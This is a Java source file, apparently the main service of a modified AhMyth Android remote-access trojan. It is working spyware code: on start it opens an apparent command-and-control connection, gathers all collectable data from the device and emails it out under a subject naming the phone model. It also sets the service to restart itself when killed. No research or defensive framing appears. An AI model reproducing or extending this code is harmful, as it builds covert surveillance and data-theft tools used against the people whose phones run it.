package ahmyth.mine.king.ahmyth;
import ahmyth.mine.ahmyth.utils.MailSender;
import ahmyth.mine.ahmyth.utils.DataCollector;
import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class MainService extends Service {
    private static Context contextOfApplication;

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        sendDataToGmail();
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }
    
    private void sendDataToGmail() {
    try {
        MailSender mailSender = new MailSender();
        DataCollector dataCollector = new DataCollector(this);
        String data = dataCollector.getAllData();
        String subject = "DATA - " + android.os.Build.MODEL;
        mailSender.sendEmail(subject, data);
    } catch (Exception e) {
        e.printStackTrace();
    }
}


}
